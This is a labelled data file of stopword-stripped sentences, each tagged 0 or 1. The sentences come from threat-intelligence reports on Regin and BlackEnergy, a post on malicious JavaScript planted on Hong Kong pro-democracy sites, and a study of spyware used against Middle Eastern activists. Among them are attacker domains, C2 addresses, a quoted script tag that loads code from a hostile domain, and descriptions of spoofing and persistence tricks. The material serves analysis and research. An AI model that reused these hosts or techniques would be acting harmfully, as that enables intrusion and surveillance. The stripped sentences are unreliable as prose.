We also recovered files infected computers may may associated 64-bit Regin including several variants svcsstat.exe file aims retrieve binary data pipes sockets execute data	1
The recovered files appear fundamentally vary 32-bit counterparts apart noteworthy differences	0
The 32-bit 64-bit versions Regin use different file names	0
These differences shown first section paper well appendix	0
Most importantly 64-bit version Regin names containers changed The 64-bit version Regin 's Stage 1 ( wshnetc.dll ) longer kernel mode driver drivers 64-bit Windows must signed	0
Instead Stage 1 user mode DLL loaded Winsock helper computer starting	1
Rather loading Stage 2 NTFS extended attribute Stage 1 looks last partition ( terms physical location ) disk searches payload raw sectors area disk	1
The 64-bit Regin 's Stage 3 recovered	0
We believe may exist 32-bit version driver	0
Stage 4 orchestrator like 32-bit counterpart uses major minor values export functionality	0
No Stage 5 payload modules recovered	0
Regin highly-complex threat used large-scale data collection intelligence gathering campaigns	1
The development operation threat would required significant investment time resources	0
Threats nature rare comparable Stuxnet/Duqu family malware	0
The discovery Regin serves highlight significant investments continue made development tools use intelligence gathering	0
Many components Regin still gone undiscovered additional functionality versions may exist	0
Symantec Norton products detect threat Backdoor.Regin	0
Regin 's data files classified Stage 5 components contained EVFS container	0
As data files stored container names	0
Just like Stage 5 modules referenced filetag aggregation major minor identifiers	0
The major identifier indicates major routine group likely handles creates file	0
Not data files recovered information remains incomplete	0
Data files associated Stage 4 kernel modules recovered Table 8 lists recovered data files used Stage 5 modules	0
The associated modules supposedly manipulate data files recovered	0
The following details used help determine whether impacted threat	0
The BlackEnergy malware crimeware turned APT tool used significant geopolitical operations lightly documented past year	0
An even interesting part BlackEnergy story relatively unknown custom plugin capabilities attack ARM MIPS platforms scripts Cisco network devices destructive plugins certificate stealer	0
Here present available data - difficult collect APT	0
We also present details targets previously unavailable present related victim profile data	0
These attackers careful hide defend long - term presence within compromised environments	0
The malware 's previously undescribed breadth means attackers present new technical challenges unusual environments including SCADA networks	0
Challenges like mitigating attackers ' lateral movement across compromised network routers may take organization 's defenders far beyond standard routine comfort zone	0
BlackEnergy2 BlackEnergy3 known tools	0
Initially cybercriminals used BlackEnergy custom plugins launching DDoS attacks	1
There indications many groups possess tool	0
BlackEnergy2 eventually seen downloading crimeware plugins - custom spam plugin banking information stealer custom plugin	1
Over time BlackEnergy2 assumed toolset BE2/Sandworm actor	0
While another crimeware group continues use BlackEnergy launch DDoS attacks BE2 APT appears used tool exclusively throughout 2014 victim sites included custom plugins scripts	1
To clear name actor BE2 APT called " Sandworm Team " also	0
Before evidence BlackEnergy2 use targeted attacks uncovered tracked strange activity one BlackEnergy CnC servers 2013	0
This strangeness related values listed newer BlackEnergy configuration files	0
As described Dmitry 's 2010 Black DDoS ' analysis configuration file downloaded server main.dll infected system	1
The config file provides download instructions loader	0
It also instructs loader pass certain commands plugins	0
In particular case 2013 config file included unknown plugin set aside usual ' ddos ' plugin listing	0
Displayed new xml formatted plugin names " weap_hwi " " ps " " vsnet " BlackEnergy configuration file download c2 server	0
This new module push must among first group module versions listed " version 1 " including ddos plugin	0
The ' ps ' plugin turned password stealer	0
The ' vsnet ' plugin intended spread launch payload ( BlackEnergy2 dropper moment ) local network using PsExec well gaining primary information user 's computer network	1
Most surprising ' weap_hwi ' plugin	0
It ddos tool compiled run ARM systems	0
At first n't know whether ARM plugin listed intentionally mistake proceeded collect CnC 's config files	0
After pulling multiple config files confirmed ARM object inclusion one - mistake	0
The server definitely delivered config files Windows also ARM / MIPS platform	1
Though unusual ARM module delivered server processed config file	1
Over time able collect several plugins well main module ARM MIPS architectures	0
All ARM / MIPS object files compiled source later pushed one config " weap_msl " " weap_mps " " nm_hwi " " nm_mps " " weap_hwi " " nm_msl "	0
It 's interesting BE2 developers upgraded ddos plugin version 2 along nm_hwi nm_mps nm_msl plugins	0
They simultaneously released version 5 weap_msl weap_mps weap_hmi plugins	0
Those assignments likely arbitrary group developed BlackEnergy2 several years professional organized style	0
Here list retrieved files related functionality The developers ' coding style differed across ' Hook ' main module plugins Windows main.dll	0
The hook main module contained encrypted strings handled function calls strings references large structure	0
This structure obfuscation may rewrite effort better modularize code could also intended complicate analysis	0
Regardless likely different individuals coded different plugins	0
So BE2 effort must small team plugin multiplatform developers	0
After decrypting strings became clear Linux Hook main module communicated CnC server Windows modules	1
This Linux module process following commands similar Windows version	0
After disclosure unusual CnC server pushed Linux new Windows plugins paid greater attention new BE2 samples associated CnCs	0
During extended period able collect many Windows plugins different CnC servers without ever noticing Linux plugins downloaded described	0
It appears BE2/SandWorm gang protected servers keeping non - Windows hacker tools plugins separate servers server folders	0
Finally CnC server hosts different set plugins meaning server works different victims uses plugins based current needs	0
Here summary list known plugins moment	0
We pretty sure list BE2 tools complete	0
For example yet obtain router access plugin confident exists	0
Evidence also supports hypothesis decryption plugin victim files ( see )	0
Our current collection represents BE2 attackers ' capabilities quite well	0
Some plugins remain mysterious purpose yet clear like ' usb ' ' bios '	0
Why would attackers need information usb bios characteristics ? It suggests based specific USB BIOS devices attackers may upload specific plugins carry additional actions	1
Perhaps destructive perhaps infect devices	0
We n't know yet	0
It 's also interesting point another plugin – ' grc '	0
In BE2 configuration files notice value " gid " type	0
This number ID plus.google.com service used ' grc ' plugin parse html	0
It downloads decrypts PNG file	0
The decrypted PNG supposed contain new CNC address never observed one	0
We aware two related GooglePlus IDs	0
The first one plus.google.com/115125387226417117030/ contains abnormal number views	0
At time writing count 75 million	0
The second one - plus.google.com/116769597454024178039/posts - currently modest little 5,000 views	0
All account 's posts deleted	0
During observation described " router - PC " CnC tracked following commands delivered config file server went offline	0
Our observation related actions	0
The issued commands Linux plugins suggest attackers controlled infected MIPS / ARM devices	1
We want pay special attention DDoS commands meant routers	0
188.128.123.52 belongs Russian Ministry Defense 212.175.109.10 belongs Turkish Ministry Interior 's government site	0
While many researchers suspect Russian actor behind BE2 judging tracked activities victim profiles 's still unclear whose interests represent	0
While observing CnCs pulling config files stumbled upon strange mistakes mis - typing	0
They highlighted image	0
First mistakes suggest BE2 attackers manually edit config files	0
Secondly shows even skilled hackers make mistakes	0
The contents config files fairly interesting	0
They contain callback c2 hardcoded ip address contain timeouts contain commands listed	0
We include list observed hardcoded ip C2 addresses along address owner geophysical location host	0
It 's interesting one servers Tor exit node	0
And according collected config files group upgraded malware communications plain text http encrypted https October 2013	0
BlackEnergy2 victims widely distributed geographically	0
We identified BlackEnergy2 targets victims following countries starting late 2013	0
There likely victims	0
Victim profiles point expansive interest ICS	0
However also noticed target list includes government property holding technology organizations well	0
We gained insight significant BE2 victim profiles summer 2014	0
Interesting BE2 incidents presented	0
The BE2 attackers successfully spearphished organization exploit current CVE metasploit module available This email message contained ZIP archive EXE file inside appear executable	1
This crafted zip archive exploited WinRAR flaw makes files zip archives appear different name file extension	0
The attached exe file turned ' BlackEnergy - like ' malware researchers already dubbed ' BlackEnergy3 ' - gang uses along BlackEnergy2	0
Kaspersky Lab detects ' BlackEnergy3 ' malware Backdoor Win32.Fonten – naming dropped file " FONTCACHE.DAT " When investigating computers company 's network BE2 associated files found suggesting BE3 used first - stage tool network	0
The config files within BE2 contained settings company 's internal web proxy	0
As APT - specific BE2 stores downloaded plugins encrypted files system ( seen older versions – plugins - memory ) administrators able collect BE2 files infected machines	1
After decrypting files could retrieve plugins launched infected machines ps vsnet fs ss dstr	0
By appearances attackers pushed ' dstr ' module understood revealed wanted hide presence machines	1
Some machines already launched plugin lost data became unbootable	0
Also machines documents encrypted related plugin could found	0
The second organization hacked via first victim 's stolen VPN credentials	0
After second organization notified infection started internal investigation	0
They confirmed data destroyed machines BE2 attackers exhibited level destructive activity	0
And revealed Cisco routers different IOS versions hacked	1
They n't able connect routers telnet found following " farewell " tcl scripts router 's file system	0
Ciscoapi.tcl – contains various wrappers cisco EXEC - commands described comments	0
The comment includes punchy message " kasperRsky "	0
Killint.tcl – uses Ciscoapi.tcl implements destroying functions	0
The script tries download ciscoapi.tcl certain FTP server served storage BE2 files	1
The organization managed discover scripts hosted server BE / SandWorm gang deleted unfortunately could n't restore deleted	0
The BE2 actor performs careful professional activity covering tracks	0
There evidence logs produced scripts also stored FTP server particular information CDP neighbors provided one procedures ciscoapi.tcl	0
The third organization got compromised type attack first one ( EXE file spoofing doc within Zip archive )	0
All plugins discovered BE2 files known revelation hacked network devices side destroyed data	0
The noticeable thing many computers contained BE2 BE3 files config files contained following URL	0
hxxps://46.165.222(dot)28/upgrade / f3395cd54cf857ddf8f2056768ff49ae / getcfg.php The URL contains md5 string ' router '	0
One discovered config files contained URL yet unidentified md5	0
hxxps://46.165.222(dot)28/upgrade / bf0dac805798cc1f633f19ce8ed6382f / upgrade.php A set victims discovered installed Siemens SCADA software ICS environment responsible downloading executing BlackEnergy	0
Starting March 2014 ending July 2014 Siemens " ccprojectmgr.exe " downloaded executed handful different payloads hosted 94.185.85.122/favicon.ico	1
They detected variants " Backdoor Win32.Blakken "	0
Each config file within BE2 main.dll field called build_id identifies malware version operators	0
Currently particular BE / SandWorm gang uses certain pattern build ids containing three hex numbers three letters follows	0
0C0703hji The numbers indicate date file creation format Year - Month - Day	0
Still purpose letters unknown likely indicates targets	0
The hex numbers n't used time sometimes observed decimal numbers	0
100914_mg 100929nrT Most interesting us earliest build could find	0
Currently " OB020Ad0V " meaning BE2/SandWorm APT started operating early beginning 2010	0
While BE dropper installs driver randomly picked non - used Windows driver name like % system32%\drivers\AliIde.sys	1
The driver self - signed 64-bit systems However new " APT " BE2 uses one following filenames used encrypted storage plugins network settings	0
They consistent serve stable IoC.	0
BE2 also uses start menu locations persistence	1
Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\flashplayerapp.exe BE3 uses following known filenames	0
% USERPROFILE%\NTUSER.LOG % LOCALAPPDATA%\FONTCACHE.DAT BE2 MD5s	0
BE3 MD5s	0
Botnet History Illustrated BlackEnergy 2 PH Days Kaspersky Lab - Maria Garnaeva Sergey Lozhkin May 2014 BlackEnergy Quedagh ( pdf ) F - Secure September 2014 Sandworm iSIGHT Partners October 2014 Alert ( ICS - ALERT-14 - 281 - 01A ) Ongoing Sophisticated Malware Campaign Compromising ICS ( Update A ) ICS - CERT October 2014	0
Posted October 9 2014 Steven Adair Over last months Volexity tracking particularly remarkable advanced persistent threat ( APT ) operation involving strategic web compromises websites Hong Kong Japan	0
In countries compromised websites particularly notable relevance current events high profile nature organizations involved	0
In particular Hong Kong compromises appear come heels Occupy Central Campaign shifting high gear	0
These compromises discovered following identification malicious JavaScript added legitimate code impacted websites	1
This code meant visitors potentially subjected exploit malicious Java Applets designed install malware systems	1
While investigating cases Volexity also discovered additional APT attack campaigns involving multiple pro - democratic websites Hong Kong	0
These attempts exploitation compromise digital surveillance detailed throughout post	0
Warning Many websites may still compromised present risk visitors	0
Browse caution	0
Alliance True Democracy € " Hong Kong Over last two days Volexity observed malicious code served website Alliance True Democracy ( ATD ) Hong Kong ( www.atd.hk )	1
ATD alliance people organizations dedicated democracy universal suffrage Hong Kong	0
At time writing malicious code still live website please visit care website clean	0
Below screen shot malicious code references found pre - pended JavaScript file website named superfish.js	0
This JavaScript file called parts website effectively nests loading additional JavaScript written interpeted	0
script language = javascript src = http://java - se.com / o.js</script The domain name java-se.com known bad associated APT activity	0
At time post domain hosted Japanese IP address 210.253.101.105	0
7506 | 210.253.96.0/20 | INTERQ | JP | GMO.JP | GMO INTERNET INC	0
Volexity yet actually see contents file o.js websites continuously returned HTTP 403 responses time requested	0
The file requested IP addresses throughout Asia without ever returning valid content	0
It € ™s unclear code activated certain times whitelist IPs restricting access file specific targets	0
This code also observed served another Hong Kong website described next section	0
While examining ATD website Volexity also observed site password protected backdoor webshell placed	1
This fairly popular webshell Volexity encountered several occasions dealing website compromises	0
Volexity refers shell Angel Webshell named default password € œangel € ​.	0
The shell simply display text € œPassword € ​ text input box Login button	0
A screen shot webshell observed ATD website seen	0
Despite shell written PHP displaying simple Login prompt easy identify Angel webshell based unique components viewable HTML source code	0
The HTML source page displayed following image	0
While Volexity operates assumption attackers placed webshells webservers compromised particular instance seen certainty	0
Attackers often upload new webshells add simple China Chopper style modifications legitimate existing files attempt maintain persistence systems	1
In last week Volexity also observed English Chinese language websites Democratic Party Hong Kong compromised malicious code found ont ATD website ( www.dphk.org | eng.dphk.org )	0
DPHK pro - democracy political party Hong Kong	0
Like ATD website time writing DPHK websites also serving malicious code please browse caution	1
During research post also became aware multiple public reports related compromise DPHK website Twitter via ThreatConnect	0
Our good friend Claudio Giurianeri posted following tweet October 3 2014 The website Democratic Party Hong Kong compromised still	0
Let know	0
# OccupyCentral Diving replies tweet plethora information regarding exploit domain java-se.com	0
In particular tweet Brandon Dixon relevant data PassiveTotal project details several subdomains IP addresses associated java-se.com	0
While Volexity observed handful hostnames wild thus far active subdomains suggest could additional - going exploit malware activity domain	0
Additional reporting activity another going back August 2014 also recently shared ThreatConnect	0
Despite attention DPHK website still compromised references JavaScript hostile domain	0
It also worth noting first time DPHK website used strategic web compromise	1
Back May 2011 Kaspersky Lab reported website leveraged target users Flash Exploits	1
The DPHK appears high value respect targeting visitors	0
During course investigating activity related ATD DPHK websites Volexity also observed website political coalition pan - democratic organization People Power Hong Kong ( www.peoplepower.hk ) compromised well	1
However unlike two websites People Power website contain JavaScript modifications pointing java- se.com	0
Instead website appears malicious iFrames leveraging Chinese URL shortener 985.so	0
At bottom several pages People Power website four iFrames seen screen shot website source	0
Those links exception first one redirect exploit pages Hong Kong IP address 58.64.178.77	0
These pages load scripts conduct profiling system various software plugins related information well load Java exploits designed install malware target system	1
If successful exploits install either 32-bit 64-bit version malware	1
Both files found within Java Archives files	0
Below details malware files	0
Filename main.dll File size 13824 bytes MD5 hash 1befa2c2d1bfc8e87d52871c868f75fe SHA1 hash 8f81bb0bfa6b3ebf3ef4ea283b23a5ccae5b6817 Notes 32-bit version malware beacons 58.64.178.77:443	0
Filename main64.dll File size 15872 bytes MD5 hash a482a84d13c76b950ce5bc7e75f4edef SHA1 hash c0a4b9145e0066f5c1534beddc9c666ea8eb0882 Notes 64-bit version malware beacons 58.64.178.77:443	0
At time writing People Power website still serving malicious code	1
Volexity recommends avoiding website and/or browsing caution	0
Volexity believes separate group attackers responsible exploit activity affiliated java-se.com operations	0
While digging deeper pro - democratic websites Hong Kong Volexity also discovered peculiar code website pro- democratic pro - universal suffrage public policy think thank The Professional Commons ( www.procommons.org.hk )	0
In case website suspicious JavaScript code writes iFrame pointing back non - existent HTML page hotel website South Korea	0
The code website seen screen shot	0
The URL question points	0
hXXp://www.hotel365.co.kr / Lnk / tw / index.html This link work redirect visitor back main page website	0
There appear reason Professional Commmons website hidden iFrame link randomly placed middle HTML code	0
It suspected formerly active exploit URL	0
If actually malicious possible code could - activated time	0
Volexity recommend URL Professional Commons website browsed caution	0
In early September APT group behind java-se.com raised visibility Volexity € ™s radar following compromise effectively impacted many components Japanese Nikkei	0
In first week September subdomain used load JavaScript code additional files onto Nikkei web properties www.nikkei.com asia.nikkei.com compromised	0
In particular JavaScript file loaded parts.nikkei.com modified reference another JavaScript file jre76.java-se.com hosted Japanese IP address 211.125.81.203	0
7506 | 211.125.80.0/22 | INTERQ | JP | GMO.JP | GMO INTERNET INC	0
The code since taken	0
However early September JavaScript pre - pended file http://parts.nikkei.com/parts/SC/s_cDS.js seen screen shot	0
Like JavaScript ATD DPHK websites Volexity never actually able obtain live copy script	0
Each request results HTTP 403 response server	0
Volexity suspects code either active select times and/or served subset visitors	0
The code observed s_cDS.js file nearly month	0
While tracking APT activity Volexity also come across seemingly unrelated compromises websites Hong Kong Japan associated java-se.com activity	0
Despite several sites compromised activity tied java-se.com result successful capture actual exploit code malware	0
However research websites activity involving java-se.com lead Volexity live exploits malware	0
In particular Volexity came across live exploit code hosted jdk-7u12-windows-i586.java-se.com Japanese IP address 210.253.96.200	0
7506 | 210.253.96.0/20 | INTERQ | JP | GMO.JP | GMO INTERNET INC	0
This system hosted JavaScript file turned loads malicious Java Applet	1
In testing Java Applet pops notification user asking want run applet	0
Volexity enough time thoroughly analyze file see actual exploit attackers rely user assisted malware installation	0
The pop - make appear file update Java	0
The popup displayed Java displayed	0
As seen image popup could misconstrued user update Java despite java-se.com domain Publisher listed WindySoft	0
Interestingly Java Archive loaded digitally signed certificate issued WindySoft online gaming company South Korea	0
We confirm certificate actually belonged WindySoft point time however fairly established precedent certificates online gaming companies used digitally sign malware attack tools	0
As one might expect choosing press Run button would bad news someone presented prompt	0
If one click Run prompt would result file css.jpg download encrypted channel folder https://elsa-jp.jp	0
Note elsa-jp.jp website hosted IP address jdk-7u12-windows-i586.java-se.com likely compromised	0
The file css.jpg course JPEG file executable encoded single - byte XOR key 0xFF	0
Filename css.jpg File size 168776 bytes MD5 hash b3a9e6548fb3cc511096af4d68b2e745 SHA1 hash 394703d1240ccd3aaeeef50c212313e3036741b1 Notes Executable file downloaded Java Applet encoded XOR 0 -99 Taking closer look resulting executable turns newer sample PlugX.	0
In particular sample interesting notable string observed	0
C:\wocawocawoca\piao\Release\caca.pdb Also interest observed Java Applet executable also digitally signed certificate issued € œWindySoft	0
€ ​ Upon execution malware sample immediately DNS resolution following hostname	0
jduhf873jdu7.blog.163.com The PlugX sample connects blog parses page command connect next	1
This similar method described FireEye blog Operation Poisoned Hurricane	0
The primary difference attackers opted use 163.com Blog Google Code page embed command	0
Taking closer look Blog page following post observed	0
The primary string focus title post DZKSCAAAAJPBBDHDDDOCCDFDFDOCCDBDHDOCHDHDDZJS Using decoding routine describe Cassidian PlugX post earlier year see command decodes instruct malware connect U.S .- based Linode IP address Hurricane Electric 173.255.217.77	0
6939 | 173.255.208.0/20 | HURRICANE | US | LINODE.COM | LINODE A look passive DNS identifies several hostnames recently resolved IP address	0
The ones still resolve IP listed	0
These hostnames may related time writing seen use malware unable confirm	0
As seen several years dissenting groups especially seeking increased levels freedom frequently find targeted surveillance information extraction	0
In digital age strategic web compromise ( exploit drive - ) become key weapon choice conduct operations	0
These types attacks far overt typical target victim opted go believe safe trusted website	0
In case post appears least two different attackers involved compromising placing malicious code Pro - Democratic websites Hong Kong	1
This first time surely last time favor democracy Hong Kong targeted	0
Unfortunately level access infrastructure attackers appear quite uphill battle	0
Continuing expose attack one means shines light attack operations aim putting dent success	0
Repressive nation-states long monitored telecommunica- tions keep tabs political dissent	0
The Internet online social networks however pose novel technical challenges practice even open new domains surveil- lance	0
We analyze extensive collection suspicious files links targeting activists opposition members non- governmental organizations Middle East past several years	0
We find artifacts reflect efforts at- tack targets ' devices purposes eavesdropping stealing information and/or unmasking anonymous users	0
We describe attack campaigns observed Bahrain Syria United Arab Emirates investigating attackers tools tech- niques	0
In addition off-the-shelf remote access trojans use third-party IP-tracking services identify commer- cial spyware marketed exclusively governments including Gamma 's FinSpy Hacking Team 's Remote Control Sys- tem ( RCS )	0
We describe use Bahrain UAE map potential broader scope activity conduct- ing global scans corresponding command-and-control ( C & C ) servers	0
Finally frame real-world consequences campaigns via strong circumstantial evidence linking hacking arrests interrogations imprisonment	0
Computer security research devotes extensive efforts pro- tecting individuals indiscriminate large-scale attacks used cybercriminals	0
Recently prob- lem protecting institutions targeted attacks conducted nation-states ( so-called '' Advanced Persistent Threats '' ) likewise elicited significant research interest	0
Where two problem domains intersect however-targeted cyber attacks nation-states individuals-has received virtually sig- nificant methodical research attention date	0
This new prob- lem space poses challenges technically complex significant real-world importance	0
In work undertake characterize emergent prob- lem space nation-state Internet attacks individuals engaged pro-democracy opposition movements	0
While lack data fully comprehensive fashion provide extensive detail technical operational perspectives seen three countries	0
We view character- izations fundamental first step necessary rigorous scientific pursuit new problem space	0
For study draw upon several years research conducted cases Bahrain Syria United Arab Emirates	0
We frame nature attacks technology infrastructure used conduct con- text impacts real people	0
We hope process inspire additional research efforts addressing difficult prob- lem adequately protect individuals limited resources facing powerful adversaries	0
As illustration phenomenon consider follow- ing anecdote pieced together public reports court documents	0
At dawn 3/12/13 police raided house 17-year- old Ali Al-Shofa confiscated laptop phone took custody	0
He charged referring Bahrain's King '' dictator '' ( ) '' fallen one '' ( ) pseudonymous Twitter account @ alkawarahnews	0
Accord- ing court documents Bahrain 's Cyber Crime Unit linked IP address registered father 's name account 12/9/12	0
Operators @ alkawarahnews later forwarded suspicious private message one authors	0
The message received 12/8/12 Facebook account linked Twitter handle contained link protest video purport- edly sent anti-government individual	0
The link redirected iplogger.org service records IP address anyone clicks	0
Analytics link indicate clicked inside Bahrain	0
On 6/25/13 Ali sentenced one year prison	0
Ali 's case example larger phenomenon in- vestigate attacks activists dissidents trade unionists human rights campaigners journalists members NGOs ( henceforth '' targets '' ) Middle East	0
The attacks documented usually involve use malicious links e-mail attachments designed obtain information device	1
On one hand observed attacks using wide range off-the-shelf spyware well publicly available third-party services like iplogger.org	1
On hand at- tacks use so-called '' lawful intercept '' trojans related equip- ment purportedly sold exclusively governments compa- nies like Gamma International Hacking Team	1
The lat- ter advertises governments need technology '' look target 's eyes '' rather rely solely '' passive monitoring ''	0
Overall attacks document rarely technically novel	0
In fact suspect majority at- tacks could substantially limited via well-known security practices settings software updates	0
Yet attacks noteworthy careful social engineering links governments real-world impact	1
We obtained majority artifacts encouraging in- dividuals might targeted governments provide us suspicious files unsolicited links especially un- familiar senders	0
While process provided rich set artifacts analyze permit us claim dataset representative	0
Our analysis links attacks common class ac- tor attacker whose behavior choice target use in- formation obtained attack aligns interests government	0
In cases Ali 's attackers appear governments ; cases appear in- stead pro-government actors ranging patriotic necessarily skilled volunteers cyber mercenaries	0
The phe- nomenon identified Libya fall Gaddafi 's regime revealed direct government ties hacking 2011 Civil War	0
We make following contributions • We analyze technology associated targeted at- tacks ( e.g. malicious links spyware ) trace back programmers manufacturers	0
While attacks novel-and indeed often involve technology used cybercrime underground-they significant be- cause real-world impact visibility connected governments	0
In addition often find amateurish mistakes either attacker 's technology operations indicating energy spent countering threats realize significant benefits	0
We how- ever conclude nation-state attacks attackers incompetent suspect attacks evaded detection	0
• When possible empirically characterize attacks technology observed	0
We map global use two commercial hacking tools governments searching Internet scan data using fingerprints command-and-control ( C & C ) servers derived spyware analysis	0
• We develop strong evidence tying attacks govern- ment sponsors corporate suppliers countering de- nials sometimes energetic sometimes indirect involvement [ ] contrast denials claims corporate '' oversight '' board	0
Our scan- ning suggests use '' lawful intercept '' trojans 11 ad- ditional countries considered governed '' authoritarian regimes	0
'' We believe activists journalists countries may experience harassment consequences life liberty government surveillance	0
Finally explore potential defenses appropriate protecting target population work	0
We believe sufficiently well-grounded meaningful manner first requires developing understanding targets ' knowledge security issues posture regarding currently protect resources ( including potentially ed- ucation ) draw upon	0
To end con- ducting ( IRB approval ) in-depth interviews potential targets along systematic examination Internet de- vices order develop understanding	0
In past decades rich body academic work grown document understand government Internet censorship in- cluding nationwide censorship campaigns like Great Fire- wall China [ ]	0
Research governmental Internet surveillance activities like law-enforcement interception comparatively smaller area	0
Some academic work looks government use devices enable censorship key- word blacklists Chinese chat clients Green Dam censorware deployed new computers sold China	0
We aware limited previous work looking advanced threat actors targeting activists hack- ing though work always able establish ev- idence government connections	0
Platforms used potential targets GMail Twitter Facebook increasingly make transport- layer encryption default obscuring communications network surveillance	0
This use encryption along global nature many social movements role diaspora groups likely makes hacking increasingly attractive especially states unable request compel content platforms	0
Indeed increasing use encryption global nature targets cited pur- veyors '' lawful intercept '' trojans marketing materi- als [ ]	0
In one notable case 2009 UAE telecom firm Eti- salat distributed system update 145,000 BlackBerry subscribers contained spyware read encrypted Black- Berry e-mail device	0
The spyware discovered update drastically slowed users ' phones	0
In con- trast country-scale distribution work looks kind pro-government government-linked surveillance highly targeted attacks	0
The term APT ( Advanced Persistent Threat ) refers sophisticated cyber-attacker persistently attempts tar- get individual group	0
Work outside academic community tracking government cyberattacks typically falls umbrella	0
There significant work APT outside academic community especially among se- curity professionals threat intelligence companies human rights groups	0
Much work focused suspected government-on-government government-on-corporation cy- ber attacks [ ]	0
Meanwhile small growing body research deals attacks carried governments opposition activist groups operating within well outside borders	0
One notable cases GhostNet large-scale cyber espionage campaign Tibetan independence movement [ ]	0
Other work avoids drawing conclusions attackers	0
Our study based extensive analysis malicious files suspect communications relevant activities targeted groups Bahrain Syria UAE documented Ta- ble 1	0
A number attacks significant real-world impli- cations per Table 2	0
In many cases keep descriptions somewhat imprecise avoid potential leakage target identi- ties	0
We began work contacted individuals con- cerned government might targeted cyber- attacks	0
As became acquainted targeted com- munities cases contacted targeted groups directly ; others reached individuals connections tar- geted groups allowed us examine communications groups	0
For Bahrain Syria work encompassed 10,000s e-mails instant messages	0
For UAE vol- ume several thousand communications	0
This following sections outline recent targeted hacking cam- paigns Bahrain Syria UAE	0
These cases com- mon theme attacks targets ' computers devices malicious files links	0
In cases attackers employed expensive '' government exclusive '' malware cases attackers used cheap readily available RATs	1
Across cases find clever social engineering often plays central role strong evidence well-informed ad- versary	1
We also however frequently find technical op- erational errors attackers enable us link attacks governments	0
In general attacks find well- detected anti-virus programs	1
We analyzed two attack campaigns context Bahrain government pursuing crackdown Arab-Spring inspired uprising since 2/14/2011	0
The first involved malicious e-mails containing FinSpy '' lawful intercept '' trojan sold exclusively governments	1
The second involved specially crafted IP spy links e-mails de- signed reveal IP addresses operators pseudonymous accounts	1
Some individuals apparently clicked links later arrested including Ali ( cf	0
§1 ) whose click appears used court	0
While campaigns point back government yet identified overlap campaigns ; targets FinSpy appeared reside mainly outside Bahrain whereas IP spy links targeted mainly inside country	0
We examine campaign turn	0
Beginning April 2012 authors received 5 suspicious e-mails US UK-based activists journalists working Bahrain	0
We found attachments contained PE ( .exe ) file designed appear image	1
Their filenames contained Uni- code right-to-left override ( RLO ) character causing Windows render filename gpj.1bajaR.exe instead exe.Rajab1.jpg	1
The .rar files contained Word document embedded ASCII-encoded PE file containing custom macro set automatically run upon document startup	1
Under default security settings Office disables unsigned macros user opens document see informational message macro disabled	0
Thus attack apparently designed belief hope targets would reduced security settings	0
Identification FinSpy By running sample using Windows Virtual PC found following string mem- ory \lsvnbranches\finspyv4.01\finspyv2\	0
This string suggests FinSpy product Gamma Inter- national	0
The executables used virtualized obfusca- tion appeared custom-designed	1
We de- vised fingerprint obfuscater located structurally similar executable searching large malware database	0
This executable contained similar string except identi- fied FinSpy v3.00 attempted connect tiger.gamma-international.de domain registered Gamma International GmbH	1
Analysis capabilities We found spyware modular design download additional modules command & control ( C & C ) server including password cap- ture ( 20 applications ) recording screenshots Skype chat file transfers input computer 's micro- phone webcam	1
To exfiltrate data back C & C server module encrypts writes disk special folder	1
The spyware period- ically probes folder files match certain naming convention sends C & C server	1
It over- writes files renames several times deletes apparent effort frustrate forensic analysis	1
Analysis encryption Because malware employed myriad known anti-debugging anti-analysis techniques thwarted attempts attach debuggers	1
Since in- clude anti-VM code ran TEMU x86 emulator de- signed malware analysis	0
TEMU captures instruction- level execution traces provides support taint-tracking	0
We found FinSpy encrypts data using custom imple- mentation AES-256-CBC	1
The 32 byte AES key 16 byte IV generated repeatedly reading low-order-4-bytes Windows clock	1
The key IV encrypted using em- bedded RSA-2048 public key stored file data	1
The private key presumably resides C & C server	0
The weak AES keys make decryption data straightfor- ward	0
We wrote program generally find keys hour exploiting fact many system clock readings occur within clock-update quantum	0
In addition FinSpy 's AES code fails encrypt last block data less AES block size 128 bits leaving trail- ing plaintext	0
Finally FinSpy 's wire protocol C & C commu- nication uses type encryption thus subject brute force attack AES keys	1
While suspect FinSpy 's cryptographic deficiencies reflect bugs also con- ceivable cryptography deliberately weakened facilitate one government monitoring surveillance oth- ers	0
C & C server The samples communicated 77.69.140.194 belongs subscriber Batelco Bahrain 's main ISP	1
Analyzing network traffic infected VM C & C server revealed server used global IPID allowed us infer server activity progression	0
In response preliminary work executive Gamma told press Bahrain 's FinSpy server merely proxy real server could anywhere part claim Bahrain FinSpy deployment could associ- ated another government	0
